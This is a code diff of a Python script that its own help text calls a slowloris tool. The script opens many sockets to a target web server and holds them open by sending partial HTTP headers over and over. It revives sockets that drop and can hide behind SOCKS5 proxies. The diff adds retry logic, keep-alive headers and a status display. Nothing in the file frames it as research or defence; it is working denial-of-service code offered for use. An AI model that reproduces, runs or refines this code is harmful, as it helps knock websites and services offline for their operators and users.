@@ -1,28 +1,30 @@
 from scapy.all import *
 import socket
-import sys
-from random import *
 import os
+from random import *
 import argparse
 import time
+import sys
 import socks
 
 def main():
+    setattr(socket.socket, 'send_header', send_header)
+
     parser = argparse.ArgumentParser(description= 'slowloris programmed in python')
-    parser.add_argument("host", help="target ip")
+    parser.add_argument("host", help="target ip", nargs = '?')
     parser.add_argument(
             '-p',
             help='host port, usually 80 for webservers',
             default=80,
             dest='port',
-            type=int
+            type=int,
             )
     parser.add_argument(
             '-s',
             help='number of sockets to open',
-            default= 1,
             dest='sockets',
-            type=int
+            type=int,
+            required=True
             )
 
             
@@ -71,22 +73,53 @@ def main():
     if args.useproxy:
         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxyhost, args.proxyport)
         socket.socket = socks.socksocket
-
-    status('initializing...')
+    print(f'initializing {args.sockets} sockets...')
     for i in range(0, args.sockets):
-        s = init_socket(args)
+        s = None
+        while s == None:
+            s = init_socket(args)
         sockets.append(s)
 
+    info = [str(args.sockets), socket.gethostbyname(args.host), str(args.port), str(args.useproxy), str(args.randagent), str(args.delay)]
     while True:
         out = iteration(sockets, args)
-        status(out)
+        printbox(info, out)
         time.sleep(args.delay)
+        os.system('cls')
         
         
-
-def status(message):
-    os.system('cls')
-    print(message)
+def printbox(info, fields):
+    fieldA = []
+    infoA = []
+    for field in fields:
+        if len(field) < len('               '):
+            extra = ' ' * ((len('               ')-len(field)))
+            field = extra + field
+            fieldA.append(field)
+        else:
+            fieldA.append(field)
+    
+    for field in info:
+        if len(field) < len('               '):
+            extra = ' ' * ((len('               ')-len(field)))
+            field = extra + field
+            infoA.append(field)
+        else:
+             infoA.append(field)
+         
+    print('------------------------------')
+    print(f'|sockets used:{infoA[0]}|')
+    print(f'|target      :{infoA[1]}|')
+    print(f'|port        :{infoA[2]}|')
+    print(f'|use proxy?  :{infoA[3]}|')
+    print(f'|rand agents?:{infoA[4]}|')
+    print(f'|delay (sec) :{infoA[5]}|')
+    print('------------------------------')
+    print(f'|dead        :{fieldA[0]}|')
+    print(f'|alive       :{fieldA[1]}|')
+    print(f'|headers sent:{fieldA[2]}|')
+    print(f'|failed inits:{fieldA[3]}|')
+    print('------------------------------')
 
 
 def load_agents(name):
@@ -101,10 +134,10 @@ def send_header(self, field, option):
 
 
 def init_socket(args):
-    port = args.port
-    dst = socket.gethostbyname(args.host)
+    
     try:
-        
+        port = args.port
+        dst = socket.gethostbyname(args.host)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((dst, port))
         s.send((f"GET / HTTP/1.1\n").encode('utf-8'))
@@ -112,34 +145,53 @@ def init_socket(args):
         if args.randagent:
             agents = load_agents('agents.txt')
             s.send_header('User-Agent', choice(agents))
+        return s
     except Exception as s:
-                print(s)
-                pass
-    return s
+        print(s)
+        if args.useproxy:
+            print('This likely occured due to a bad proxy.')
+            sys.exit(1)
+        pass
+    return None
+    
 
 
 
 def iteration(list, args):
     dead = 0
-    alive = len(list)
-    out = []
-    out.append(f'{alive} alive')
-    for i in list:
+    headers = 0
+    failed = 0
+    print(f'start of iteration...')
+    print(f'sending {len(list)} headers...')
+    for i in range(len(list)-1, -1, -1):
+        sock = list[i]
         try:
-            i.send_header('X-a', str(randint(0, 5000)))
-        except socket.error:
-
-            list.remove(i)
+            sock.send_header('Connection', 'keep-alive')
+        except socket.error as s:
+            list.remove(sock)
             dead += 1
-    out.append(f'sent {alive-dead} headers, {dead} unresponsive')
-    
-    out.append(f'reviving {dead} dead sockets')
-    for i in range(0, dead):
-        s = init_socket(args)
-        list.append(s)
-    alive = len(list)
-    out.append(f'revived all dead sockets, {alive} alive')
-    return '\n'.join(out)
+        except Exception as s:
+        
+            print(f'error: {s}')
+            
+            continue
+        else:
+            headers += 1
 
-setattr(socket.socket, 'send_header', send_header)
+    alive = str(len(list))
+
+    print(f'reviving {dead} dead sockets...')
+    for i in range(0, dead):
+        try:
+            s = init_socket(args)
+            list.append(s)
+        except Exception:
+            print(f'socket initialization error...')
+            failed += 1
+            continue
+    print(f'{len(list)} sockets alive...')
+    print(f'end of iteration...')
+    out = [str(dead), alive, str(headers), str(failed)]
+    return out
+
 main()
